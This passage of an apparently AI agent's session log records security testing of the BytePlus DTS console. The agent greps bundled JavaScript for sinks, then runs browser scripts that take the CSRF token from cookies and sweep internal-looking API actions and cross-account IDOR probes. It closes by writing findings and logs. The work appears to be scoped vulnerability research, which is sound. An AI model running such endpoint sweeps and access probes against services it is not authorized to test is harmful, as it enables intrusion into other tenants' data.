+[0m$ [0mcd /tmp/dtsjs && echo "=== 2382 location ==="; grep -oE '.{200}location\.(href|search).{250}' 2382.bc8c653e.js | head -20; echo "=== 6326 location/URLSearchParams/open ==="; grep -oE '.{150}(URLSearchParams|location\.search|window\.open).{250}' 6326.c2c15716.js | head -30
+=== 2382 location ===
+.t("request_error",{},"\u8bf7\u6c42\u9519\u8bef"),r.oc.t("asyncrunsafe_request_error",{},"asyncRunSafe\u8bf7\u6c42\u9519\u8bef"),e),console.error(e.stack||e),[e,null]}}));function l(e){const n=window.location.search.substring(1).split("&");for(let t=0;t<n.length;t++){const r=n[t].split("=");if(r[0]===e)return r[1]}return!1}function a(e,n){let t=e;if(n){t=t+"?"+Object.keys(n).map((e=>e+"="+n[e])).join("&")}return t}function s(e,n){const t=document.createElement(
+n(r.oc.t("code_error",{},"\u4ee3\u7801\u9519\u8bef"),r.oc.t("domain_base64_decoding_error",{},"\u57df\u540dbase64\u89e3\u7801\u9519\u8bef"),c)}return`/${o}/region:${o}+${n}/${t}`}function p(e){window.location.href=f(e)}function v(e){const n={};for(const[t,r]of e)n[t]=r;return n}function m(e){const n=document.createElement("a");n.href=e,n.target="_blank",n.click(),n.remove()}},99995:function(e,n,t){t.d(n,{j:function(){return o}});var r=t(83314),i=t(747);const 
+=== 6326 location/URLSearchParams/open ===
+i.Pi)((({form:e,btnClassName:t,listDataSourceType:n})=>{const i=(0,P.useHistory)(),l=n===h.Yz.Src,[s,r]=(0,o.useState)(!1),c=(0,o.useRef)(null),u=new URLSearchParams(window.location.search).get("TaskType"),d=(0,m.get)(e.values,`${l?T.g.SourceConnect:T.g.DestConnect}.${T.g.RegionSettings}.Region`),g=(0,K.ZN)(e.values);return o.createElement(o.Fragment,null,o.createElement(p.Z,{type:"text",onClick:()=>r(!0),classN
+sBytePlus?null:o.createElement(_.Z,{content:a.oc.t("help_documentation",{},"\u5e2e\u52a9\u6587\u6863")},o.createElement(y.Z,{className:J,onClick:()=>{window.open((0,ee.w)({docs:te.RT.getDocLinkHub()["dataSource-management-helpdoc"]}),"_blank")}}))),footer:null,unmountOnExit:!0},o.createElement(v.ZP,{ref:c,config:X({sourceEndpointType:l?void 0:(0,m.get)(g,`${T.g.SourceConnect}.${T.g.SourceInstanceInsertWay}`)
+:i.DBInstanceId,region:null!=(t=null==(e=i.RegionSettings)?void 0:e.Region)?t:(0,v.w9)(),template:He.RT.getLinkToProduct()["volc-sqlserver-backup"]});window.open(n,"_blank")}},a.oc.t("manually_create_a_full_backup",{},"\u624b\u52a8\u521b\u5efa\u5168\u91cf\u5907\u4efd")),a.oc.t("select_the_last_full_backup_to_perform_the_migration;_dts_automatically_recogniz",{},"\uff0c \u9009\u62e9\u6700\u8fd1\u4e00\u6b21\u5
+region:null==(a=null==(n=e.values.SourceConnect)?void 0:n.RegionSettings)?void 0:a.Region,template:w.RT.getLinkToProduct()["volc-sqlserver-backup"]});window.open(o,"_blank")}},[o.oc.t("sql_server_data_recovery_capabilities",{},"SQL Server\u7684\u6570\u636e\u6062\u590d\u529f\u80fd")])])}}}}},effect:(e,t)=>{e.effects.fieldsReactive({fieldNames:l.g.TaskRunType,deps:[L.VP["SourceConnect-SourceInstanceInsertWay"]
+const o=t.value;if(o===h){const o=null==(a=null==(n=t.dataSource)?void 0:n.find((e=>e.value!==h)))?void 0:a.value;return t.setValue(null!=e?e:o),void window.open(P,"_blank","noopener,noreferrer")}o&&(e=o)}))}},field:{title:a.oc.t("instance_type",{},"\u5b9e\u4f8b\u7c7b\u578b"),name:i.g.SourceInstanceType,hidden:e=>{var t,n;return Boolean(null==(n=null==(t=e.data)?void 0:t.scenesParams)?void 0:n.EnableEdit)},d
+[0m
+[0m$ [0mcd /tmp/dtsjs && python3 - <<'PY'
+s=open('2382.bc8c653e.js').read()
+i=s.find('domain_base64_decoding_error')
+print(s[i-1500:i+800])
+PY
+est_error",{},"\u8bf7\u6c42\u9519\u8bef"),r.oc.t("asyncrunsafe_request_error",{},"asyncRunSafe\u8bf7\u6c42\u9519\u8bef"),e),console.error(e.stack||e),[e,null]}}));function l(e){const n=window.location.search.substring(1).split("&");for(let t=0;t<n.length;t++){const r=n[t].split("=");if(r[0]===e)return r[1]}return!1}function a(e,n){let t=e;if(n){t=t+"?"+Object.keys(n).map((e=>e+"="+n[e])).join("&")}return t}function s(e,n){const t=document.createElement("input");t.setAttribute("value",e),document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t),"function"==typeof n&&n()}const d={[o.gr.Beijing]:"aHR0cHM6Ly9sZi12b2xjZW5naW5lLXN0b3JhZ2UtbWFuYWdlbWVudC5ieXRlZC5vcmc=",[o.gr.Shanghai]:"aHR0cHM6Ly9zaC12b2xjZW5naW5lLXN0b3JhZ2UtbWFuYWdlbWVudC5ieXRlZC5vcmc=",[o.gr.Guangzhou]:"aHR0cHM6Ly9nei12b2xjZW5naW5lLXN0b3JhZ2UtbWFuYWdlbWVudC5ieXRlZC5vcmc=",[o.gr.BOE3]:"aHR0cDovL3N0b3JhZ2UtYm9lLXRlc3QuYnl0ZWRhbmNlLm5ldA==",[o.gr.BOE4]:"aHR0cDovL29wZW5hcGkuYm9lLnN0b3JhZ2UtdG9iLXBoeS5ieXRlZGFuY2UubmV0",[o.gr.BOE_Guilin]:"aHR0cDovL3N5Ym9lLXN0b3JhZ2UtdG9iLmJ5dGVkYW5jZS5uZXQ=",[o.gr.BOE_Nanjing]:"aHR0cHM6Ly9uamJvZS1zdG9yYWdlLXRvYi5ieXRlZGFuY2UubmV0",[o.gr.BOE_Chongqing]:"aHR0cHM6Ly9jcWJvZS1zdG9yYWdlLXRvYi5ieXRlZGFuY2UubmV0"};function f(e){const{region:n=(0,i.w9)(),path:t,product:o="dts"}=e;if(i.U8.isOps)try{return`${((null==d?void 0:d[n])?window.atob(d[n]):void 0)||""}/product/${o}/${t}`}catch(c){i.Hj.warn(r.oc.t("code_error",{},"\u4ee3\u7801\u9519\u8bef"),r.oc.t("domain_base64_decoding_error",{},"\u57df\u540dbase64\u89e3\u7801\u9519\u8bef"),c)}return`/${o}/region:${o}+${n}/${t}`}function p(e){window.location.href=f(e)}function v(e){const n={};for(const[t,r]of e)n[t]=r;return n}function m(e){const n=document.createElement("a");n.href=e,n.target="_blank",n.click(),n.remove()}},99995:function(e,n,t){t.d(n,{j:function(){return o}});var r=t(83314),i=t(747);const o=(e,n)=>{let t=Number(e);return isNaN(t)?"-":(n&&(t*=1e3),i.U8.isBytePlus?r.IM.formatI18nTime(t,{utcSuffix:!0}):r.IM.formatI18nTime(t))}},32994:function(e,n,t){t.d(n,{b:function(){return o}});var r=t(35187),i=t(747);const o=e=>{var n;const t=r.h.commonStore.supportRegions.find((n=>n.value===e));return t?t.label:null==(n=i.cr.region.volcRegionList.find((n=>n.RegionCode===e)))?void 0:n.CnName}},4
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const bid='2116046640132395013';\n  const acts=['ListDataSourceAccounts','ListDataSourceDbs','ListDataSourceTables','ListDataSourceColumns','ListDataSourceDomains','ListDataSourceInstances','ListDataSourceInstanceNodes','ListDataSourceRules','ListDataSourceViews','ListDataSourceFunctions','ListDataSourceProcedures','ListDataSourceSequences','ListDataSourceTriggers','ListDataSourceExtensions','ListDataSourceEvents','DescribeTables','DescribeShardInfo','DescribeMongoInstanceRelatedSolutions'];\n  const out=[];\n  for(const a of acts){\n    const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),6000); const t0=Date.now();\n    try{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:bid}),signal:ctl.signal});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';out.push({a,ms:Date.now()-t0,code,len:t.length,snip:code==='OK'?t.slice(0,220):t.match(/\"Message\":\"([^\"]+)\"/)?.[1]});}catch(e){out.push({a,ms:Date.now()-t0,err:String(e).slice(0,40)})}finally{clearTimeout(to)}\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ids={A:'2115010182613307397',B:'2116046640132395013'};\n  const acts=['ListDataSourceAccounts','ListDataSourceDbs','ListDataSourceTables','ListDataSourceDomains','DescribeTables'];\n  const out=[];\n  for(const [label,id] of Object.entries(ids)){\n    for(const a of acts){\n      const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),7000); const t0=Date.now();\n      try{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSource:{DataSourceId:id}}),signal:ctl.signal});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';out.push({label,a,ms:Date.now()-t0,code,len:t.length,snip:code==='OK'?t.slice(0,200):t.match(/\"Message\":\"([^\"]+)\"/)?.[1]});}catch(e){out.push({label,a,err:String(e).slice(0,40)})}finally{clearTimeout(to)}\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+[0m
+[0m$ [0mcd /tmp/dtsjs && for a in ListDataSourceDbs ListDataSourceAccounts DescribeTables SearchDataSourceTablesAsync ListDataSourceTables; do echo "=== $a ==="; grep -oE ".{180}$a.{220}" *.js | head -3; done
+=== ListDataSourceDbs ===
+6326.c2c15716.js:tanceId:null==(S=null==P?void 0:P.VolcMSSQLSettings)?void 0:S.DBInstanceId,BackupId:null==(v=null==P?void 0:P.VolcMSSQLSettings)?void 0:v.FullBackupId,RegionId:V},{Region:V}):(0,r.ListDataSourceDbs)({DataSource:P,TaskId:D},{Region:V}),w=E?u.C7:(0,u.F4)({endpointType:k,taskType:C,form:M,params:L}),N={};let B=[];if(F)if((null==L?void 0:L.supabaseDB)||(null==L?void 0:L.supabaseStorage)){const e=null!=(T=null==F?void 
+6326.c2c15716.js:rray:_}=e,y=m&&(null==(n=null==(t=(0,p.Lp)(m))?void 0:t.value)?void 0:n.Region),v=g&&(null==(u=null==(a=(0,p.Lp)(g))?void 0:a.value)?void 0:u.Region),[T,h]=yield Promise.all([(0,r.ListDataSourceDbs)({DataSource:m,TaskId:f},{Region:y}),(0,r.ListDataSourceDbs)({DataSource:g,TaskId:f},{Region:v})]),[P,C]=T,[,D]=h,k=(null==(d=(null==D?void 0:D.DatabaseDetails)||(null==D?void 0:D.Databases))?void 0:d.length)||256,E={},
+6326.c2c15716.js:=(n=null==S?void 0:S.SrcConfig)?void 0:n.EndpointType);if(!_&&S&&t){const t=S.SrcConfig&&(null==(o=null==(a=(0,f.Lp)(S.SrcConfig))?void 0:a.value)?void 0:o.Region),[n,i]=yield(0,b.ListDataSourceDbs)({DataSource:S.SrcConfig,TaskId:S.TaskId},{Region:t});if(n)throw n;null==(l=e.setData)||l.call(e,{redisDbs:(null==i?void 0:i.Databases)||[]})}if(_&&t&&(null==g?void 0:g.TaskType)){const n=(0,f.f6)({type:t,values:_,listD
+=== ListDataSourceAccounts ===
+6326.c2c15716.js:0),u=n(9817);function d(e){return t=>{return n=this,a=null,o=function*(){var n,a;const o=e(t),i=o&&(null==(a=null==(n=(0,c.Lp)(o))?void 0:n.value)?void 0:a.Region),[l,s]=yield(0,r.ListDataSourceAccounts)({DataSource:o},{Region:i});return!l&&(null==s?void 0:s.Accounts)?s.Accounts:[]},new Promise(((e,t)=>{var i=e=>{try{s(o.next(e))}catch(n){t(n)}},l=e=>{try{s(o.throw(e))}catch(n){t(n)}},s=t=>t.done?e(t.value):Promise.res
+index.b73cff3d.js:ataSourceSqlsValid",e.GetSecurityToken="GetSecurityToken",e.DescribeDataSourceType="DescribeDataSourceType",e.DescribeMQTopics="DescribeMQTopics",e.ListEgressIps="ListEgressIps",e.ListDataSourceAccounts="ListDataSourceAccounts",e.ListDataSourceTypes="ListDataSourceTypes",e.ListDataSourceDbs="ListDataSourceDbs",e.ListDataSourceTables="ListDataSourceTables",e.SearchDataSourceTablesAsync="SearchDataSourceTablesAsync",e.Ge
+index.b73cff3d.js:tions)?void 0:r.describe)?s:"\u8bf7\u6c42ListDataSourceInstanceNodes\u5931\u8d25",null==t?void 0:t.logOptions)},W=(e,t)=>{var a,o,r,s;return(0,i.Qu)(i.L5.postV2(e,c(c({Action:n.aU.ListDataSourceAccounts,Service:d,Version:p},u),t)),null!=(o=null==(a=null==t?void 0:t.logOptions)?void 0:a.scene)?o:"dtsService(2022-10-01)\u8bf7\u6c42\u5931\u8d25",null!=(s=null==(r=null==t?void 0:t.logOptions)?void 0:r.describe)?s:"\u8bf7\u
+=== DescribeTables ===
+6326.c2c15716.js:ll,(function*(){var r,u;const d=(0,s.get)(n,`${c.g.DestConnect}.${c.g.RegionSettings}.Region`),p=e(n)||[],m=p.map((e=>e.SrcObjName||""));if(!m.length)return[];const[g,S]=yield(0,l.DescribeTables)({DBNames:m,DataSource:t,ObjectType:i.LP.Table,TaskId:null==(r=a.data.taskInfo)?void 0:r.TaskId},{Region:d});if(!g&&S){const e=a.values.IdxNameRule;return((e,t,n)=>e.map((e=>{const a=t.find((t=>t.DB===e.DB&&t.Table===e.
+index.b73cff3d.js:nsions="ListDataSourceExtensions",e.ListDataSourceColumns="ListDataSourceColumns",e.ListDataSourceInstances="ListDataSourceInstances",e.ListDataSourceFiles="ListDataSourceFiles",e.DescribeTables="DescribeTables",e.DescribeESClusterMetaInfo="DescribeESClusterMetaInfo",e.ListDataSourceInstanceNodes="ListDataSourceInstanceNodes",e.StartETLDebug="StartETLDebug",e.GenerateETL="GenerateETL",e.OpenMSSQLDBOnline="OpenM
+index.b73cff3d.js:logOptions)?void 0:r.describe)?s:"\u8bf7\u6c42ListDataSourceAccounts\u5931\u8d25",null==t?void 0:t.logOptions)},K=(e,t)=>{var a,o,r,s;return(0,i.Qu)(i.L5.postV2(e,c(c({Action:n.aU.DescribeTables,Service:d,Version:p},u),t)),null!=(o=null==(a=null==t?void 0:t.logOptions)?void 0:a.scene)?o:"dtsService(2022-10-01)\u8bf7\u6c42\u5931\u8d25",null!=(s=null==(r=null==t?void 0:t.logOptions)?void 0:r.describe)?s:"\u8bf7\u
+=== SearchDataSourceTablesAsync ===
+9864.44fa83f1.js:tion*(){try{new RegExp(e,"g")}catch(a){return void Le.Z.warning(o.oc.t("regular_grammar_is_incorrect",{},"\u6b63\u5219\u8bed\u6cd5\u4e0d\u6b63\u786e"))}u(!0);const[l,n]=yield(0,Re.SearchDataSourceTablesAsync)({Key:e,DataSource:(0,Ae.dM)(t,Me.Yz.Src)});!l&&(null==n?void 0:n.AsyncId)?g({id:n.AsyncId}):u(!1)}))})),[]);const{run:y,cancel:E}=(0,Te.Z)((()=>Be(undefined,null,(function*(){return yield(0,Re.GetDataSourceTablesSearch
+index.b73cff3d.js:ListDataSourceAccounts="ListDataSourceAccounts",e.ListDataSourceTypes="ListDataSourceTypes",e.ListDataSourceDbs="ListDataSourceDbs",e.ListDataSourceTables="ListDataSourceTables",e.SearchDataSourceTablesAsync="SearchDataSourceTablesAsync",e.GetDataSourceTablesSearchResult="GetDataSourceTablesSearchResult",e.ListDataSourceViews="ListDataSourceViews",e.ListDataSourceFunctions="ListDataSourceFunctions",e.ListDataSourceProcedure
+index.b73cff3d.js: 0:t.logOptions)?void 0:r.describe)?s:"\u8bf7\u6c42OpenMSSQLDBOnline\u5931\u8d25",null==t?void 0:t.logOptions)},O=(e,t)=>{var a,o,r,s;return(0,i.Qu)(i.L5.postV2(e,c(c({Action:n.aU.SearchDataSourceTablesAsync,Service:d,Version:p},u),t)),null!=(o=null==(a=null==t?void 0:t.logOptions)?void 0:a.scene)?o:"dtsService(2022-10-01)\u8bf7\u6c42\u5931\u8d25",null!=(s=null==(r=null==t?void 0:t.logOptions)?void 0:r.describe)?s:"\u8bf7\u
+=== ListDataSourceTables ===
+6326.c2c15716.js:leEditTaskType:[o.UA.DataSubscription],icon:a.createElement(s.Z,null),fetch:e=>T(undefined,null,(function*(){var t;const{params:n,Region:o,editable:i,taskType:r}=e,[c,u]=yield(0,l.ListDataSourceTables)(n,{Region:o}),d={};return c||null==(t=null==u?void 0:u.Tables)||t.forEach((e=>{var t;d[e]={nodeType:"item",name:e,key:e,icon:a.createElement(s.Z,null),editable:i,editableValidator:S.r2,renderNode:S.$u,enableFilterCheck
+9864.44fa83f1.js:=(null==(l=e.props.dataRef)?void 0:l.key)}));if(!l)return;l&&(l.disableCheckbox=!0,d());const o=t&&(null==(r=null==(a=(0,f.Lp)(t))?void 0:a.value)?void 0:r.Region),[,m]=yield(0,Re.ListDataSourceTables)({DataSource:t,Db:e.props.dataRef.name},{Region:o});if(l.disableCheckbox=!1,l&&m){const e=[];l.children=null==(i=null==m?void 0:m.Tables)?void 0:i.map((t=>(e.push(`${l.key}-${t}`),{title:t,key:`${l.key}-${t}`,icon:c.cre
+index.b73cff3d.js:beMQTopics",e.ListEgressIps="ListEgressIps",e.ListDataSourceAccounts="ListDataSourceAccounts",e.ListDataSourceTypes="ListDataSourceTypes",e.ListDataSourceDbs="ListDataSourceDbs",e.ListDataSourceTables="ListDataSourceTables",e.SearchDataSourceTablesAsync="SearchDataSourceTablesAsync",e.GetDataSourceTablesSearchResult="GetDataSourceTablesSearchResult",e.ListDataSourceViews="ListDataSourceViews",e.ListDataSourceFunction
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),18000); const t0=Date.now();\n  try{const r=await fetch('/api/top/dts/GetSecurityToken/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({Type:'SecurityTokenOfBinlogInTOS'}),signal:ctl.signal});const t=await r.text();return {ms:Date.now()-t0,status:r.status,body:t.slice(0,1200)};}catch(e){return {ms:Date.now()-t0,err:String(e)}}finally{clearTimeout(to)}\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const acts=['ListDFlowKV','PreviewDFlowKV','DescribeDFlowList','GetObject','OperateObject','ListMgrParam','DescribeBusinessInfo','DescribeAllClusters','ListAccount','DescribeGateways','DescribeScheduleCluster'];\n  const out=[];\n  for(const a of acts){for(const ver of ['2022-10-01','2018-01-01']){\n    try{const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:'{}'});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';if(code!=='InvalidActionOrVersion')out.push({a,ver,code,len:t.length,snip:code==='OK'?t.slice(0,300):t.match(/\"Message\":\"([^\"]+)\"/)?.[1]});}catch(e){}\n  }}\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const bodies=[{PageNum:1,PageSize:10},{PageNumber:1,PageSize:10},{Page:1,Limit:10},{AccountId:'3001021825'},{Keyword:''}];\n  const out=[];\n  for(const a of ['ListAccount','DescribeAllClusters']){for(const b of bodies){\n    try{const r=await fetch(`/api/top/dts/${a}/2018-01-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(b)});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';out.push({a,b,code,len:t.length,snip:code==='OK'?t.slice(0,350):t.match(/\"Message\":\"([^\"]+)\"/)?.[1]});}catch(e){out.push({a,b,err:String(e).slice(0,30)})}\n  }}\n  return out;\n}","waitForStableDom":false}
+[0m
+[0m← [0mWrite result/server-side/notes.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/inventory/routes.md
+Wrote file successfully.
+[0m
+[0m$ [0mcd /tmp/dtsjs && sha256sum *.js | sort
+22fb5fefc86c1ec9c864219adac89122412f5307e85ce6593f5aeb40c31cc5c6  3889.2d6dbdc4.js
+30e0c916a23eff614c6e6156e6801b8e4a4f5fa79024438f9c0023eb4677366a  6326.c2c15716.js
+401e4896e42e7e47a863305751419d72d13a2fa8459784aa1f41bf5b4efe79c7  4741.0a1aa325.js
+4d58312ee65ece72bd51c23fc87eb43264525127a91397a29bcc74d917f280fa  6137.2e8ae536.js
+5cd4c222e2a4006f06a0da305d7ee1dd369ab87d812e6d68671bb458e73bf947  1741.f713a0d4.js
+5d41b9c4cf8064de028893984a50774b9055d46dbb0316c53275e074363e97ad  6600.6203c101.js
+78c991dbfa7f4db961e268b743fae1770c9135fbab8283b7de300dd2c63a5436  8650.2ffc0d60.js
+7f1ad04f8c99ccf6baf6e246f83c49a5f8c5950d440cef95f556f0c40ea76b90  9864.44fa83f1.js
+8ba05a86459037e021f2bd2c0aec2f8fdd31be5b1a11f181a7db07511788e2d0  1885.ac1e5208.js
+a52db23ab50a00738ca4e48c0603c94c9836ea93f95c1adbc59fb32f6670b99d  t_ListDataMigration.fea382f2.js
+ba142c539ccf72475134a2e393750441d2b60c6407539ef0144f4b3cc69d82ff  2382.bc8c653e.js
+e1d73c02377884d7579fcf9cc1a2ea50c252cc05b26d4698205ee04772659eec  index.b73cff3d.js
+ee1972a96fcf46e2e7ce2de688160f1fec427458f22e98cc06cd221786ac76e8  7667.ae053c18.js
+f21d6e61744d48be466530dd346400005e38e0b2fc124b73a0c89afdbdbb89bf  606.1e5e1456.js
+[0m
+[0m← [0mWrite result/inventory/javascript.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/inventory/sinks.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/inventory/listeners.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/inventory/endpoints.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/testing-inventory.json
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/server-side/api-inventory.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/server-side/test-ledger.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/server-side/test-ledger.json
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/client-side/console.byteplus.com/dts-list/route-report.md
+Wrote file successfully.
+[0m
+[0m$ [0mmkdir -p result/client-side/console.byteplus.com/dts-list/javascript/snippets result/findings/DTS-INFO-001/evidence result/findings/DTS-INFO-001/payloads
+cp result/findings/DTS-INFO-001/response.json result/findings/DTS-INFO-001/evidence/response.json 2>/dev/null || true
+cat > result/client-side/console.byteplus.com/dts-list/sources.md <<'EOF'
+# Sources — DTS list route
+
+- `location.search` / `URLSearchParams` reads `TaskType` (6326).
+- `window.location.search` helper `l()` (2382).
+- No `location.hash`, `document.referrer`, `window.name`, storage or postMessage
+  sources observed in the route chunks.
+EOF
+cat > result/client-side/console.byteplus.com/dts-list/sinks.md <<'EOF'
+# Sinks — DTS list route
+
+- No HTML execution sinks (`innerHTML`, `dangerouslySetInnerHTML`,
+  `insertAdjacentHTML`, `document.write`, `eval`, `new Function`) with user
+  input.
+- `window.location.href = f(...)` exists in 2382 but is ops-only and not
+  attacker-controlled.
+- `window.open(...)` targets static documentation/product URLs.
+EOF
+cat > result/client-side/console.byteplus.com/dts-list/flows.md <<'EOF'
+# Flows — DTS list route
+
+| Source | Sink | File | Status |
+|---|---|---|---|
+| `location.search TaskType` | form config selection | 6326.c2c15716.js | Not Vulnerable |
+| `location.search region/path` | `window.location.href` path builder | 2382.bc8c653e.js | Not Vulnerable (ops-only, not attacker-controlled) |
+EOF
+cat > result/client-side/console.byteplus.com/dts-list/listeners.md <<'EOF'
+# Listeners — DTS list route
+
+No `message` listeners found. No postMessage testing applicable.
+EOF
+cat > result/client-side/console.byteplus.com/dts-list/javascript/manifest.md <<'EOF'
+# JavaScript manifest — DTS list route
+
+14 route-loaded chunks analyzed; see `result/inventory/javascript.md` for URLs
+and SHA-256 hashes. Retrieved 2026-10-30T09:35Z. No chunks were copied into the
+repository.
+EOF
+ls -R result/client-side result/findings
+result/client-side:
+console.byteplus.com
+
+result/client-side/console.byteplus.com:
+dts-list
+
+result/client-side/console.byteplus.com/dts-list:
+flows.md
+javascript
+listeners.md
+route-report.md
+sinks.md
+sources.md
+
+result/client-side/console.byteplus.com/dts-list/javascript:
+manifest.md
+snippets
+
+result/client-side/console.byteplus.com/dts-list/javascript/snippets:
+
+result/findings:
+DTS-INFO-001
+
+result/findings/DTS-INFO-001:
+evidence
+payloads
+response.json
+
+result/findings/DTS-INFO-001/evidence:
+response.json
+
+result/findings/DTS-INFO-001/payloads:
+[0m
+[0m← [0mWrite result/findings/DTS-INFO-001/report.md
+Wrote file successfully.
+[0m
+[0m$ [0mcat > result/findings/DTS-INFO-001/payloads/request.txt <<'EOF'
+POST /api/top/dts/ListMgrCustomerParam/2018-01-01/ap-southeast-1 HTTP/1.1
+Host: console.byteplus.com
+Content-Type: application/json; charset=UTF-8
+x-csrf-token: <csrfToken cookie>
+x-storage-request-source: Web
+x-storage-language: en
+x-dts-accept-language: en
+
+{}
+EOF
+cat > result/unresolved.md <<'EOF'
+# Unresolved items
+
+- **Task-detail IDOR/BOLA**: `CreateTransmissionTask`/`CreateValidationTask`
+  require a nested `SrcConfig`/`DestConfig`/`SolutionSettings` schema that could
+  not be reconstructed from public docs (SPA-rendered) or opaque `InternalError`
+  responses. No TaskId was created, so `DescribeTransmissionTaskInfo` /
+  `DescribeValidationTaskInfo` cross-account tests could not be run.
+- **`GetSecurityToken`** (`SecurityTokenOfBinlogInTOS`): request hangs >18s for
+  both test accounts; could not evaluate STS credential scope.
+- **`ListAccount` / `DescribeAllClusters`**: registered at 2018-01-01 but return
+  opaque `InternalError` for paging/account parameter guesses; internal-only or
+  broken, not usable.
+- **Hidden routes `/dts/params`, `/dts/dflow`**: console-level 404 for the test
+  account (micro-app does not mount them).
+- **Stored XSS in data-source/task names**: not tested in the UI; React escaping
+  is expected, and no delivery to a privileged viewer was identified.
+- **`/dts/modifyOrder`**: order/billing action intentionally not tested
+  (payment/business-logic side effects).
+EOF
+cat > result/logs/client-side.log <<'EOF'
+2026-10-30T09:35Z client-side: downloaded/analyzed 14 route-loaded DTS chunks (see inventory/javascript.md)
+2026-10-30T09:35Z sinks: no dangerouslySetInnerHTML/innerHTML/insertAdjacentHTML/document.write/eval; no postMessage listeners
+2026-10-30T09:36Z sources: TaskType/location.search form selection, ops-only location.href path builder -> not vulnerable
+2026-10-30T09:36Z client-side phase complete: no finding
+EOF
+cat > result/logs/server-side.log <<'EOF'
+2026-10-30T09:32Z account A 3000823185; account B 3001021825 (isolated context acctB)
+2026-10-30T09:32Z created test DS A 2115010182613307397
+2026-10-30T09:32Z DescribeDataSource cross-account A->B: Result{} (no leak)
+2026-10-30T09:33Z ListDataSource Identifier/AccountId/TenantId/OwnerId filters: no cross-account leak
+2026-10-30T09:33Z ModifyDataSource A->B: InternalError/MgrParamInvalid, B unchanged
+2026-10-30T09:33Z DeleteDataSource A->B: Result{}; B re-read confirms object exists (no-op)
+2026-10-30T09:33Z CreateDataSource mass assignment (TenantId/AccountId/Owner/Tags): ignored
+2026-10-30T09:34Z ListMgrCustomerParam: internal tenant whitelist config returned -> DTS-INFO-001 excluded
+2026-10-30T09:34Z CheckDataSourceConnection private/reserved/encoded IPs: blocked
+2026-10-30T09:35Z GetSecurityToken: timeout >18s (unresolved)
+2026-10-30T09:35Z registered-read-action sweep: no other cross-tenant leak (ListAccount/DescribeAllClusters InternalError)
+EOF
+echo done
+done
+[0m
+[0m← [0mWrite result/SUMMARY.md
+Wrote file successfully.
+[0m
+[0m$ [0mcat >> result/logs/session.md <<'EOF'
+
+## Attempt 41033977109 progress (2026-10-30T09:31Z onward)
+
+- Re-read AGENT.md and both skill files; MCP available.
+- Logged in A (3000823185) and B (3001021825, isolated context `acctB`).
+- Created test DS A 2115010182613307397; verified cross-account read/modify/
+  delete isolation against B objects (all blocked).
+- Mass assignment, SSRF, CSRF, SQLi probes: negative.
+- Client-side sink sweep over 14 route-loaded chunks: no actionable XSS.
+- DTS-INFO-001 (ListMgrCustomerParam internal config disclosure) documented and
+  excluded from confirmed-vuln.txt.
+- No high-impact confirmed finding. Result files written; run complete.
+EOF
